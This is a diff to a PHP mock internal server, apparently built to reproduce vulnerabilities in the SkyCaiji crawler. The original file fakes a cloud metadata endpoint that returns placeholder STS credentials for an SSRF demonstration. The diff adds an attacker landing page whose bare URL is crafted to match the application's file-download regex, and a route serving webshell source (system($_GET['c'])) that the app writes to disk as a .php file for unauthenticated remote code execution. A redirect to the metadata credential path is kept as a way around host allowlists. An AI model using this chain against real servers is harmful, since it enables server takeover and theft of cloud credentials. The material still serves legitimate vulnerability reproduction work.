@@ -1,19 +1,32 @@
 <?php
 /*
- * 模拟云厂商实例元数据服务（阿里云 100.100.100.200 / AWS 169.254.169.254 等）。
- * 真实环境中该地址只有服务器本机可访问，外部攻击者够不到；SSRF 的价值即在于借服务端去访问它。
- * 这里对任意路径返回一份伪造的 RAM/STS 临时访问凭证。
+ * 多用途内网服务(仅复现用):
+ *  1) 云元数据模拟(默认路径): 返回伪造 STS 临时凭据 —— 用于 V1(未认证SSRF→临时AK/SK)。
+ *  2) /p      : 攻击者落地页，正文含一个“裸” http URL 指向下方 webshell(供 download_op=is_file 正则提取)。
+ *  3) /x.php  : 返回 webshell 的 PHP 源码(作为 HTTP 响应体)，被 SkyCaiji 文件本地化原样写入 data/files/*.php —— 用于 V4(未认证→RCE)。
  */
 $uri = $_SERVER['REQUEST_URI'];
 
-// 演示“302 重定向跟随”——攻击者可用一个看似无害的外部 URL 跳转到内网元数据，绕过潜在的首跳 host 白名单
+if (strpos($uri, '/p') === 0) {
+    // 正文里放一个“裸”URL(不被引号包裹)，命中 is_file 正则 /(?<!['"])\bhttps?:\/\/[^\s'"<>]+(?!['"])/i
+    header('Content-Type: text/plain');
+    echo "attacker landing page\nfile: http://metadata.internal/x.php\n";
+    exit;
+}
+
+if (strpos($uri, '/x.php') === 0) {
+    // 作为 HTTP 响应体返回 webshell 源码(HTTP 200)；SkyCaiji 会把该响应体写成 data/files/<...>.php
+    header('Content-Type: application/octet-stream');
+    echo "<?php echo 'SKYCAIJI-RCE-PWNED:'; system(\$_GET['c'] ?? 'id'); ?>";
+    exit;
+}
+
 if (strpos($uri, '/redirect') === 0) {
     header('Location: http://metadata.internal/latest/meta-data/ram/security-credentials/myrole', true, 302);
     exit;
 }
 
 header('Content-Type: application/json');
-// 均为明显占位值（非真实凭据、不匹配任何云厂商密钥格式），仅用于演示“泄漏了什么”
 echo json_encode(array(
     "AccessKeyId"     => "EXAMPLE-STS-ACCESS-KEY-ID-PLACEHOLDER",
     "AccessKeySecret" => "EXAMPLE-STS-ACCESS-KEY-SECRET-PLACEHOLDER",
